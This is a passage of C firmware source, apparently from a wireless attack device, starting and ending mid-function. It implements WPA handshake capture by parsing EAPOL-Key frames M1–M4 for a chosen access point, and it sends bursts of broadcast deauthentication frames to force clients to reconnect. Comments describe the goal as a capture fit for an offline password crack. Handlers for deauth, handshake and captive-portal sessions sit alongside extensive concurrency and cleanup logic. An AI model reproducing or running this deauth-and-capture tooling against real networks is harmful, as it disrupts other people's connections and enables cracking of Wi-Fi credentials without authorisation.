    if (len < 24 + 8 + 4 + 2) return 0;
    uint16_t fc = (uint16_t)(f[0] | (f[1] << 8));
    uint8_t type = (fc >> 2) & 0x3, subtype = (fc >> 4) & 0xF;
    if (type != 2) return 0; /* Data frames only */
    unsigned hdr = 24;
    if (subtype & 0x8) hdr += 2; /* QoS control */
    if (len < (unsigned)hdr + 8 + 4) return 0;
    static const uint8_t llc[6] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00};
    if (memcmp(f + hdr, llc, 6) != 0) return 0;
    uint16_t ethertype = (uint16_t)((f[hdr + 6] << 8) | f[hdr + 7]);
    if (ethertype != 0x888E) return 0;
    unsigned eapol = hdr + 8;
    if (len < eapol + 4) return 0;
    uint8_t eapol_type = f[eapol + 1];
    if (eapol_type != 3) return 0; /* EAPOL-Key only */
    if (len < eapol + 4 + 1 + 2) return 0;
    uint16_t key_info = (uint16_t)((f[eapol + 5] << 8) | f[eapol + 6]); /* big-endian on the wire */
    int ack = (key_info >> 7) & 1, mic = (key_info >> 8) & 1, secure = (key_info >> 9) & 1, install = (key_info >> 6) & 1;
    if (ack && !mic && !secure) return 1;
    if (!ack && mic && !secure) return 2;
    if (ack && mic && secure && install) return 3;
    if (!ack && mic && secure) return 4;
    return 0;
}

/* + item 11 "Handshake capture is unsafe and semantically incomplete" ("natural
 * success marks the operation complete but normally does not stop promiscuous
 * mode, release the arbiter, restore STA, or emit the terminal stopped event"):
 * a real target's M4 completion (hs_frame_cb, firing from the Wi-Fi driver's own
 * task) and an explicit STOP request (handle_handshake_stop, firing from a
 * transport dispatch) can now genuinely race each other -- both call this ONE
 * shared finish routine with their own desired final state; mtk_op_transition's
 * return value (not a separate racy pre-check) decides which of them actually
 * performs cleanup, so it happens exactly once regardless of which side reaches
 * it first. Previously, M4 completion only transitioned the operation record and
 * did nothing else -- leaving the radio in promiscuous mode indefinitely on a
 * real target until a client happened to also send an explicit STOP. */
/* This used to call mtk_op_transition FIRST (locking in `status` as the record's
 * own final_status before restore's real result was even known -- a STATUS/STOP
 * query racing this could observe a stale "OK" the emitted event's own
 * separately-computed field simultaneously contradicted) and released the
 * arbiter unconditionally regardless of restore's own result
 * (mtek_wifi_restore_and_release's own doc comment: "Failure quarantines the
 * radio behind the existing lease" -- releasing anyway here defeated that
 * entirely for this operation). Now: claim the single finalization path first
 * (mtk_op_claim_ finalization -- matching mtek_capture_service.h's own
 * established capture_teardown pattern exactly), perform the real cleanup, THEN
 * write the one truthful terminal state/status derived from what cleanup
 * actually found -- never the other order. Takes (token, boot_epoch), not a
 * retained pointer: hs_frame_cb's own `rec` is a fresh, same-callframe
 * mtk_op_find result (never retained past this call either way), but expressing
 * this function's own contract in terms of the atomic token/epoch pair -- like
 * mtek_capture_service.h's own capture_teardown -- keeps every caller symmetric
 * and never requires a live pointer. */
static void handshake_finish(uint32_t token, uint32_t boot_epoch, mtk_op_state_t final_state, uint8_t status) {
    if (!mtk_op_claim_finalization(token, boot_epoch)) return; /* lost the race (or already terminal/stopping): the winner already did this */
    /* Snapshot the shared fields this event needs under the lock, then use/emit
     * AFTER releasing it -- never hold a lock across an external sink call (this
     * file's own established rule, matching mtek_capture_service.h's own).
     *
     * Captured HERE, BEFORE releasing MTK_ARB_H below
     * (mtek_wifi_restore_and_release) -- not after, as the previous ordering
     * did. Once that release genuinely happens, a brand-new
     * handle_handshake_start could race in, acquire MTK_ARB_H, and reinitialize
     * s_hs for a completely different session; reading s_hs's own fields
     * (session_generation/sink/len) AFTER that point could pick up the NEW
     * session's values while still reporting THIS (old) token -- exactly the
     * "old callback must never read/modify a newly initialized session's state"
     * hazard closes. session_generation is the ORIGINATING session's own, stored
     * once at handle_handshake_start time -- never a caller's own ctx, which
     * this function does not even have: it is called from hs_frame_cb, a
     * background driver callback with no request context at all, and from
     * handle_handshake_stop, whose own STOP-caller session is not necessarily
     * this long-lived session's originating one. */
    wifi_lock();
    uint32_t captured_len = s_hs.len;
    mtk_sink_t sink = s_hs.sink;
    uint32_t session_generation = s_hs.session_generation;
    wifi_unlock();
    if (s_hal && s_hal->promisc_stop) s_hal->promisc_stop();
    /* + RC11 "keep the radio lease quarantined, never report/expose it as
     * healthy/free on a restore failure": mtek_wifi_restore_and_release only
     * releases MTK_ARB_H if restore itself actually succeeded; a failure retains
     * the lease (quarantined, mtek_wifi_radio_is_quarantined) rather than
     * freeing it for a new operation to acquire over unconfirmed radio state. */
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_H, token);
    uint8_t final_status = (restore_rc == 0) ? status : MTK_STATUS_IO_ERROR;
    mtk_op_transition_by_token(token, boot_epoch, final_state, final_status, now_ms());
    /* mtk_op_begin_publish_guard, held across the whole publish, closes
     * the window between winning finalization above and actually
     * emitting -- exactly like the five request-handler producers
     * already fixed in the prior round (see mtk_op_begin_publish_guard's
     * own doc comment in mtek_core.h). restore_sta_mode already ran
     * above, OUTSIDE any guard -- a real, potentially slow HAL round-trip
     * must never be held under this lock. */
    if (mtk_op_begin_publish_guard(session_generation)) {
        mtk_handshake_stopped_ev_t ev = {0};
        ev.operation_token = token;
        ev.status = final_status;
        ev.captured_total_len = captured_len;
        sink.emit_event(sink.user, token, "HANDSHAKE_STOPPED", &ev, &mtk_handshake_stopped_ev_t_desc);
        mtk_op_end_publish_guard();
    }
}

static void hs_frame_cb(void *user, const uint8_t *frame, uint16_t len, int8_t rssi, uint8_t channel) {
    (void)rssi; (void)channel;
    /* `user` is now an IMMUTABLE per-registration identity -- the operation
     * token, captured ONCE at handle_handshake_start's own promisc_start call
     * and frozen inside this exact registration's own callback parameter for its
     * whole lifetime -- never a pointer to the mutable s_hs global (an earlier
     * design: `user == &s_hs`, which is no different from reading s_hs directly
     * and carries no identity of its own at all). esp32_promisc_service can
     * legitimately copy (cb, user) together, under its own mutex, an instant
     * BEFORE a concurrent STOP runs -- and, on a real target, a brand-new
     * HANDSHAKE_START can then reinitialize s_hs for a wholly different
     * operation before this already-copied, now-stale call actually executes.
     * Reading s_hs.token/boot_epoch through a live pointer (the old design)
     * would validate this stale call against the NEW session's own identity and
     * could corrupt or even complete it using frame bytes that actually came
     * from the OLD session's radio capture. Comparing this frozen token against
     * s_hs's CURRENT token, under lock, is the first and only gate that cannot
     * be fooled this way: a mismatch means s_hs has moved on, regardless of how
     * self- consistent whatever it currently holds looks. */
    uint32_t registered_token = (uint32_t)(uintptr_t)user;
    wifi_lock();
    if (s_hs.token != registered_token) { wifi_unlock(); return; }
    uint32_t boot_epoch = s_hs.boot_epoch;
    mtk_mac6_t target_bssid = s_hs.target_bssid;
    wifi_unlock();
    /* RC11 promiscuous-mode audit follow-up #2/#4 "reject STOPPING as well
     * as terminal" / "replace remaining callback-side mtk_op_find pointer
     * dereferences with atomic mtk_op_snapshot reads": `not found` or
     * STOPPING (a concurrent STOP/finalization already claimed this
     * operation and may be mid-cleanup -- handshake_finish's own
     * promisc_stop call could already be in flight) means this callback
     * must not deliver into a session that is no longer this one's own to
     * touch, matching the actual safety gate (handshake_finish's own
     * locked mtk_op_claim_finalization, not this fast-path filter). */
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot(registered_token, boot_epoch, &snap)) return;
    if (mtk_op_state_is_terminal(snap.state) || snap.state == MTK_OPS_STOPPING) return;
    if (!frame_matches_target_bssid(frame, len, target_bssid)) return; /* not the requested AP/station */
    int m = classify_eapol(frame, len);
    if (m == 0) return;
    wifi_lock();
    /* The checks above ran UNLOCKED, before this call did any real work -- s_hs
     * could have been reinitialized for a brand-new handshake session in the
     * meantime. Re-validated HERE, under the same lock protecting every field
     * this call is about to mutate, immediately before mutating any of them: a
     * mismatch means this stale callback invocation must not touch whatever
     * session s_hs now holds. */
    if (s_hs.token != registered_token || s_hs.boot_epoch != boot_epoch) { wifi_unlock(); return; }
    if (s_hs.len + len <= HANDSHAKE_MAX_BYTES) { memcpy(s_hs.buf + s_hs.len, frame, len); s_hs.len += len; }
    uint8_t phase = (m == 1) ? 0 /* FOUND_EAPOL */ : (m < 4 ? 1 /* CAPTURED */ : 2 /* SUCCESS */);
    s_hs.seen_mask |= (uint8_t)(1u << (m - 1));
    uint8_t seen_mask = s_hs.seen_mask;
    mtk_sink_t sink = s_hs.sink;
    uint32_t session_generation = s_hs.session_generation;
    wifi_unlock();
    /* mtk_op_begin_publish_guard, held across the whole publish, closes
     * the window between this snapshot/re-validation and actually
     * emitting -- a peer-session reset landing exactly here must still
     * never let this event reach the wire under the OLD session. See its
     * own doc comment in mtek_core.h. */
    if (mtk_op_begin_publish_guard(session_generation)) {
        mtk_handshake_event_ev_t ev = {0};
        ev.operation_token = registered_token; ev.phase = phase; ev.key_frame = (uint8_t)m; ev.visible_drop_count = 0;
        sink.emit_event(sink.user, registered_token, "HANDSHAKE_EVENT", &ev, &mtk_handshake_event_ev_t_desc);
        mtk_op_end_publish_guard();
    }
    /* "completion check accepts message 4 plus either message 1 or 2 rather than
     * proving the declared capture criteria." The minimum genuinely crackable
     * capture needs BOTH the AP's ANonce (M1) and the station's SNonce+MIC (M2)
     * -- an offline crack attempt is mathematically impossible with only one of
     * them, regardless of whether M4 was also observed. 0x03 = bit0 (M1) AND
     * bit1 (M2) both set (was `& 0x03` != 0, true if EITHER bit was set -- the
     * bug). M3 is not required for cracking and is not checked here; M4 remains
     * the trigger (its own SUCCESS phase/event), now gated on the real
     * prerequisite. */
    if (m == 4 && (seen_mask & 0x03) == 0x03) {
        handshake_finish(registered_token, boot_epoch, MTK_OPS_COMPLETED, MTK_STATUS_OK);
    }
}

static void handle_handshake_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                    const uint8_t *req_bytes, size_t req_len) {
    mtk_handshake_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    if (req.channel < 1 || req.channel > 13) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }

    /* M3 correction (independent review P0 "the D->H handoff uses a coherent but
     * unstable snapshot and an unconditional release"): the admission guard now
     * opens FIRST, before the D-ownership snapshot, and stays open through the
     * handoff decision and release -- exactly like every other admission site in
     * this tree. The previous ordering read D's ownership and force-released it
     * entirely OUTSIDE any guard: a concurrent DEAUTH_STOP/deauth_finalize could
     * legitimately release D on its own in that window, letting a brand-new
     * operation install itself as the new arbiter owner before this function's
     * own unconditional mtk_arbiter_force_release ran -- which would then
     * silently clear that NEW owner's lease, not D's. Opening the guard here
     * serializes the whole decision against exactly the same concurrent
     * admissions/session resets mtk_op_begin_admission_guard exists to serialize
     * everywhere else. */
    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }

    /* D->H guarded transition. */
    /* Coherent-reader fix: one snapshot instead of a separate class check
     * and a separate token read -- a concurrent worker could otherwise
     * change ownership between the two, e.g. this branch could enter on a
     * genuinely-D class read and then read a token for whatever NEWER
     * operation replaced it. */
    mtk_arbiter_snapshot_t dh_snap = mtk_arbiter_snapshot();
    if (dh_snap.cls == MTK_ARB_D) {
        /* M3 correction: test-only pause seam, firing here -- right after
         * the D snapshot, still holding the admission guard's pub_lock
         * (never the arbiter lock) -- so a test can pause deterministically
         * at exactly the point the independent review's own required race
         * test targets. Always NULL (a true no-op) outside such a test. */
        if (s_dh_handoff_pause_hook) s_dh_handoff_pause_hook();
        /* Never retain a raw mtk_op_find pointer across the transition call
         * below -- re-snapshot after transitioning to observe the state it
         * actually wrote, instead of an unsynchronized re-read through a pointer
         * whose slot a concurrent worker could have already recycled for a
         * different operation. */
        uint32_t d_token = dh_snap.token;
        mtk_operation_record_t d_snap;
        int d_found = mtk_op_snapshot(d_token, ctx->boot_epoch, &d_snap);
        if (d_found && !mtk_op_state_is_terminal(d_snap.state)) {
            mtk_op_transition_by_token(d_token, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
            d_found = mtk_op_snapshot(d_token, ctx->boot_epoch, &d_snap);
        }
        /* M3 correction: an atomic OWNER-CHECKED release of exactly (MTK_ARB_D,
         * d_token) -- never mtk_arbiter_force_release, which clears whatever
         * class/token happens to be active right now regardless of whether it is
         * still this exact D operation. Still inside the SAME admission guard
         * opened above, so nothing else can install a different owner between
         * this decision and this release. If d_token is no longer the active D
         * owner by now (it already released itself through its own normal
         * cleanup, e.g. deauth_finalize), this is a safe no-op -- exactly the
         * case this correction closes. */
        if (d_found && mtk_op_state_is_terminal(d_snap.state)) {
            mtk_arbiter_release_if_owner(MTK_ARB_D, d_token);
        } else {
            mtk_arbiter_release_if_owner(MTK_ARB_D, d_token);
            if (d_found) mtk_op_transition_by_token(d_token, ctx->boot_epoch, MTK_OPS_FAILED, MTK_STATUS_TIMEOUT, now_ms());
            mtk_op_end_admission_guard();
            respond_empty(ctx, MTK_STATUS_RADIO_CONFLICT); return;
        }
    }
    int no_mem = 0;
    /* The identity is copied out atomically at mint time -- no raw record
     * pointer is retained past this point, including across the ACCEPTED
     * response and the promisc_start call below (hs_frame_cb can start firing
     * before this function even returns). */
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    if (mtk_arbiter_acquire(MTK_ARB_H, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    /* M2 independent-review correction (addendum P0 "cancellation-visible state
     * is still published after the guard"): s_hs's complete initial state --
     * including token/sink/boot_epoch/session_generation, which handshake_finish
     * reads BEFORE any cleanup/publication -- must be committed before
     * ACCEPTED/before the guard unlocks, for the same reason as s_deauth above:
     * a peer-session reset that acquires the guard immediately after
     * mtk_op_end_admission_guard (below) can already see MTK_ARB_H/this token
     * and call handshake_finish for it; that must never run against a stale or
     * zero-initialized s_hs (a stale/uninitialized sink call, wrong-session
     * output, or reading a PRIOR session's own leftover fields). Still moved
     * here BEFORE hs_frame_cb can possibly start firing (hal->promisc_start,
     * further below) -- 's own "one atomic unit, never observed mid-write"
     * requirement is unaffected by moving earlier. */
    wifi_lock();
    memset(&s_hs, 0, sizeof(s_hs));
    /* RC11 promiscuous-mode audit follow-up #3 "store the operation
     * record's core boot_epoch in long-lived handshake and capture
     * sessions, not the transport context's epoch": id.boot_epoch (the
     * mtk_core-internal epoch this record was actually allocated under)
     * -- NOT ctx->boot_epoch, which is the CALLING TRANSPORT's own link/
     * peer epoch and can change independently (e.g. a peer HELLO
     * mid-session, mtek_spi_native_dispatch.c) while this long-lived,
     * callback-driven session is still active. Using the transport epoch
     * here would make hs_frame_cb's own later mtk_op_snapshot calls
     * spuriously fail the moment the PEER's epoch changes, even though
     * nothing about this operation's own core-side validity changed --
     * the exact same hazard this file's own handle_deauth_start doc
     * comment already identified and fixed for its background send loop. */
    s_hs.token = id.token; s_hs.sink = ctx->sink; s_hs.boot_epoch = id.boot_epoch;
    /* The originating session generation, stored once here so
     * hs_frame_cb/handshake_ finish -- both of which run long after this call
     * returns, from contexts with no request ctx of their own -- can validate
     * against it later. */
    s_hs.session_generation = ctx->session_generation;
    s_hs.target_bssid = req.target_bssid; s_hs.channel = req.channel;
    wifi_unlock();

    mtk_handshake_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_handshake_start_resp_t_desc);
    mtk_op_end_admission_guard();

    /* promisc_start's return value was previously discarded entirely -- if
     * callback registration, channel selection, or promiscuous-mode enable
     * failed on the real HAL, the operation stayed RUNNING forever (no cleanup,
     * no terminal event) and the initiating deauth burst below still fired
     * regardless, transmitting real frames for a capture that could never
     * actually receive anything. Closed exactly like hs_frame_cb's own M4
     * completion and handle_handshake_stop: one shared handshake_finish call,
     * gated on mtk_op_transition's own return value (a concurrent STOP
     * dispatched in the brief window between ACCEPTED and this failure check is
     * already handled the same way every other race in this file is), so
     * cleanup/restore/the terminal event each happen exactly once. */
    /* `user` is this exact registration's own immutable token, not a pointer to
     * the mutable s_hs global -- see hs_frame_cb's own doc comment for the full
     * ABA-hazard rationale. */
    int promisc_rc = (s_hal && s_hal->promisc_start) ? s_hal->promisc_start(req.channel, hs_frame_cb, (void *)(uintptr_t)id.token) : -1;
    if (promisc_rc != 0) {
        handshake_finish(id.token, id.boot_epoch, MTK_OPS_FAILED, MTK_STATUS_IO_ERROR);
        return;
    }
    for (uint16_t i = 0; i < req.deauth_count; i++) {
        if (s_hal && s_hal->send_deauth) {
            mtk_hal_mac6_t bcast; memset(bcast.b, 0xFF, 6);
            s_hal->send_deauth(to_hal_mac(req.target_bssid), bcast, req.channel);
        }
    }
    /* HAL fake delivers captured frames synchronously inside promisc_start
     * for host tests -- if that already drove this capture to natural
     * M4 completion, hs_frame_cb's own handshake_finish call (above, via
     * the fake HAL's synchronous callback) has ALREADY performed full
     * cleanup and emitted HANDSHAKE_STOPPED; nothing further to do here.
     * A target build's real HAL invokes hs_frame_cb from the Wi-Fi
     * driver's own promiscuous-mode task as frames arrive, and this
     * function returns immediately after arming capture -- cleanup then
     * happens later, whenever hs_frame_cb or handle_handshake_stop
     * actually wins the race (handshake_finish, above/below). */
}

static void handle_handshake_status(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                     const uint8_t *req_bytes, size_t req_len) {
    mtk_handshake_status_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, HANDSHAKE_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    /* s_hs's own captured bytes belong to whichever token s_hs.token currently
     * names -- a valid-but-unrelated token (a stale slot address reused by a
     * different, later operation) must never be answered with a PRIOR session's
     * leftover length. */
    mtk_handshake_status_resp_t r; r.state = (uint8_t)snap.state;
    wifi_lock();
    r.total_len = (s_hs.token == req.operation_token) ? s_hs.len : 0;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_handshake_status_resp_t_desc);
}

static void handle_handshake_read(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                   const uint8_t *req_bytes, size_t req_len) {
    mtk_handshake_read_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t precheck_snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, HANDSHAKE_START_OPCODE, &precheck_snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    /* Same stale-session guard as handle_handshake_status above -- never hand
     * back a PRIOR session's captured bytes for an unrelated token. locked for
     * the whole read (including the buf memcpy below) -- hs_frame_cb can be
     * concurrently appending to s_hs.buf/len on a real target's own Wi-Fi driver
     * task. */
    wifi_lock();
    uint8_t session_matches = (s_hs.token == req.operation_token);
    uint32_t session_len = session_matches ? s_hs.len : 0;
    mtk_handshake_read_resp_t r; memset(&r, 0, sizeof(r));
    uint16_t max_len = req.max_len > 512 ? 512 : req.max_len;
    uint32_t off = req.offset;
    uint32_t avail = (off < session_len) ? (session_len - off) : 0;
    uint32_t n = avail < max_len ? avail : max_len;
    r.data.len = (uint16_t)n;
    if (n && session_matches) memcpy(r.data.data, s_hs.buf + off, n);
    r.total_len = session_len;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_handshake_read_resp_t_desc);
}

static void handle_handshake_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                   const uint8_t *req_bytes, size_t req_len) {
    mtk_handshake_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t precheck_snap;
    /* Family gate (HANDSHAKE_START) -- a non-HANDSHAKE token is rejected
     * NOT_FOUND before handshake_finish could finalize a foreign operation. */
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, HANDSHAKE_START_OPCODE, &precheck_snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    /* Same linearization as deauth's own STOP/natural-completion race
     * (handshake_finish's own doc comment above): whichever of this STOP
     * and a concurrent hs_frame_cb M4 completion wins the transition is
     * the only one that performs cleanup. */
    handshake_finish(req.operation_token, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK);
    /* handshake_finish no longer writes rec->state/final_status directly inline
     * with this call (it claims finalization, cleans up, THEN writes the
     * truthful terminal state -- possibly after this STOP itself lost that race
     * to a concurrent hs_frame_cb) -- a fresh locked snapshot is the only honest
     * way to report the operation's real current state here, matching
     * mtek_capture_service.h's own handle_capture_stop pattern. */
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, HANDSHAKE_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    mtk_handshake_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_handshake_stop_resp_t_desc);
}

/* Wi-Fi stop-all / recovery / mode / mac / raw TX ---------- */

static void handle_wifi_stop_all(mtk_request_ctx_t *ctx) {
    mtk_wifi_stop_all_resp_t r; memset(&r, 0, sizeof(r));
    /* Coherent-reader fix: one snapshot instead of a separate class read
     * (line below) and a separate token read -- the decision this
     * function makes depends on both together. */
    mtk_arbiter_snapshot_t snap = mtk_arbiter_snapshot();
    mtk_arbiter_class_t active = snap.cls;
    if (active == MTK_ARB_WMC || active == MTK_ARB_WS || active == MTK_ARB_BEACON ||
        active == MTK_ARB_D || active == MTK_ARB_H || active == MTK_ARB_M ||
        active == MTK_ARB_SAP || active == MTK_ARB_RAW) {
        uint32_t tok = snap.token;

        /* WMC (STA_CONNECT) and WS (AP/STA_SCAN) each drive an uncancellable
         * blocking HAL call with no cancel hook of their own reliably honored
         * within this one synchronous call -- the generic
         * "transition-then-unconditionally-restore-and-force-release" path below
         * (still correct and UNCHANGED for D/H/M/BEACON/SAP/ RAW, none of which
         * have this hazard) would restore/release the radio while that blocking
         * call might still genuinely be running, letting a brand-new operation
         * of the same class start a second, overlapping HAL call. These two
         * classes are instead handled exactly like
         * mtek_wifi_cancel_active_for_peer_reset's own WMC/WS handling -- fence
         * the token (WMC) or run the established quiescence handshake (WS),
         * NEVER touching restore/ arbiter directly; only the real worker's own
         * tail (handle_sta_
         * connect's/handle_ap_scan_start's/handle_sta_scan_start's own, already
         * token-ownership-gated) safely restores/releases, once its blocking
         * call actually returns. */
        if (active == MTK_ARB_WMC) {
            mtk_op_transition_by_token(tok, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
        } else if (active == MTK_ARB_WS) {
            wifi_quiesce_and_fence_ws(tok, ctx->boot_epoch);
        } else {
            /* Token-based snapshot/transition, never a retained mtk_op_find
             * pointer -- see handle_handshake_start's D->H transition above for
             * the identical pattern and rationale. */
            mtk_operation_record_t stop_all_snap;
            if (mtk_op_snapshot(tok, ctx->boot_epoch, &stop_all_snap) && !mtk_op_state_is_terminal(stop_all_snap.state)) {
                mtk_op_transition_by_token(tok, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
            }
            /* A single best- effort restore_sta_mode call followed by an
             * UNCONDITIONAL mtk_arbiter_force_release used to hand the radio to
             * the next caller as confirmed-free even when restore itself
             * reported failure -- exactly the "report/expose a quarantined lease
             * as healthy/free" this correction forbids. esp32_restore_sta_mode's
             * own contract (mtek_wifi_hal_esp32.c) preserves the captured
             * prior-state snapshot across a failed attempt specifically so a
             * retry here can attempt the exact same recovery again, rather than
             * acting on a half-restored, now-unknown state; a bounded number of
             * attempts (with a real pacing delay between them, via the same
             * s_hal->pace_delay_ms every other paced retry in this file already
             * uses) gives a transient failure a real chance to clear before this
             * falls back to quarantine. The arbiter lease is force-released only
             * once a retry actually confirms success; if every attempt fails,
             * the lease stays held (quarantined) so a later operation cannot
             * mistake it for free -- the caller may call WIFI_STOP_ALL again to
             * retry. This response schema has no per-item restore-status field
             * to extend without touching the frozen wire format; the honest
             * recovery signal is GET_WIFI_RECOVERY_STATE's own sta_mode_restored
             * field, which already reflects "is the arbiter free" truthfully
             * once this is fixed. */
            int restore_rc = -1;
            const int max_attempts = 3;
            for (int attempt = 0; attempt < max_attempts && restore_rc != 0; attempt++) {
                if (attempt > 0 && s_hal && s_hal->pace_delay_ms) s_hal->pace_delay_ms(100);
                restore_rc = (s_hal && s_hal->restore_sta_mode) ? s_hal->restore_sta_mode() : 0;
            }
            wifi_lock();
            s_radio_quarantined = (restore_rc != 0);
            wifi_unlock();
            if (restore_rc == 0) {
                mtk_arbiter_force_release();
            }
        }
        r.stopped_operations.count = 1;
        r.stopped_operations.items[0] = tok;
    }
    respond(ctx, MTK_STATUS_OK, &r, &mtk_wifi_stop_all_resp_t_desc);
}

/* See mtek_wifi_service.h's own doc comment on this function's declaration for
 * the full rationale. Reuses each opcode's own already-established finalize
 * helper (deauth_finalize, handshake_finish) so cleanup is byte-for-byte
 * identical to a real STOP -- never a second, independently-drifting cleanup
 * path -- and falls back to the same transition+restore shape
 * handle_wifi_stop_all's own WS branch already uses for AP/STA scan (which have
 * no single shared finalize helper of their own, only STOP's own bounded
 * quiescence handshake, unsuitable for a synchronous cancel-and-evict). */
/* Defined with the rest of the SoftAP lifecycle further down; declared here
 * because the peer-reset path below must be able to tear down an AP that a
 * departed peer left serving. */
static void softap_teardown(uint32_t token, uint32_t boot_epoch, uint8_t status);

mtk_op_id_t mtek_wifi_cancel_active_for_peer_reset(void) {
    mtk_op_id_t id = {0, 0};

    /* An ALREADY- connected STA session is a "Wi-Fi connection" the peer session
     * leaves behind even though its own arbiter lease (MTK_ARB_WMC) was already
     * released the instant the original CONNECT attempt completed (this file's
     * own established design: WMC is held only for the duration of the attempt
     * itself, never while merely remaining connected -- see handle_sta_connect).
     * Checked and torn down here independently of the arbiter-class switch
     * below, which only ever sees an IN-PROGRESS attempt, never an
     * already-connected, arbiter-free session. */
    if (mtek_wifi_is_sta_connected()) {
        if (s_hal && s_hal->disconnect) s_hal->disconnect();
        wifi_lock(); s_sta_connected = 0; wifi_unlock();
    }

    /* Coherent-reader fix: one snapshot instead of a separate class read
     * and a separate token read. */
    mtk_arbiter_snapshot_t snap = mtk_arbiter_snapshot();
    mtk_arbiter_class_t active = snap.cls;
    if (active != MTK_ARB_D && active != MTK_ARB_H && active != MTK_ARB_WMC &&
        active != MTK_ARB_WS && active != MTK_ARB_SAP) return id;
    uint32_t tok = snap.token;
    uint32_t epoch = mtk_core_boot_epoch();
    switch (active) {
        case MTK_ARB_D:
            deauth_finalize(tok, epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, NULL);
            break;
        case MTK_ARB_H:
            handshake_finish(tok, epoch, MTK_OPS_STOPPED, MTK_STATUS_OK);
            break;
        case MTK_ARB_SAP:
            /* A SoftAP (or captive portal, which holds this same class) left
             * running by a departed peer keeps beaconing and serving DHCP; it
             * must come down with the session that started it. */
            softap_teardown(tok, epoch, MTK_STATUS_OK);
            break;
        case MTK_ARB_WMC:
            /* No cancel hook exists for a blocking HAL connect call
             * (mtek_wifi_hal.h has none) -- fence instead of waiting: claim this
             * exact token via the SAME token-based transition
             * handle_sta_connect's own tail uses, so only the winner ever
             * touches s_sta_connected. A worker that later loses this race (per
             * handle_sta_connect's own doc comment) tears down any real
             * HAL-level connection it still manages to form, on its own.
             *
             * This deliberately does NOT release MTK_ARB_WMC, even on winning
             * the transition above. The old connect call this token belongs to
             * has no cancel hook and may still genuinely be running on another
             * thread; releasing the class here would let a brand-new STA_CONNECT
             * acquire it and start a SECOND, overlapping connect against the
             * same radio hardware. handle_sta_connect's own tail already
             * releases MTK_ARB_WMC
             * unconditionally-but-atomically-ownership-checked
             * (mtk_arbiter_release_if_owner) the instant its real HAL call
             * returns, regardless of whether it also wins this same transition
             * race -- that is the ONLY place this class is ever safely released
             * for an in-progress connect, exactly once, never orphaned and never
             * released early. */
            mtk_op_transition_by_token(tok, epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
            break;
        case MTK_ARB_WS: {
            /* Mirror handle_ap_scan_stop/handle_sta_scan_stop's own established
             * quiescence handshake EXACTLY: signal cancellation (safe no-op if
             * nothing is in flight for either), then wait BOUNDED for the
             * worker's own natural completion path
             * (handle_ap_scan_start/handle_sta_scan_ start, both already gated
             * on mtk_op_claim_finalization) to perform the REAL cleanup itself
             * -- radio restore, arbiter release, truthful transition, terminal
             * event -- never touch the radio directly here, which would race
             * that same worker's own concurrent HAL access to it. This whole
             * invalidation runs synchronously while processing the current
             * HELLO, strictly before any later request can be fed, so whatever
             * the worker publishes while this call waits is safely serialized
             * before any new peer session's own operation could possibly start.
             * This never touches the radio itself (never restore_sta_mode, never
             * mtk_arbiter_ release) -- that remains solely
             * handle_ap_scan_start's/ handle_sta_scan_start's own job, now
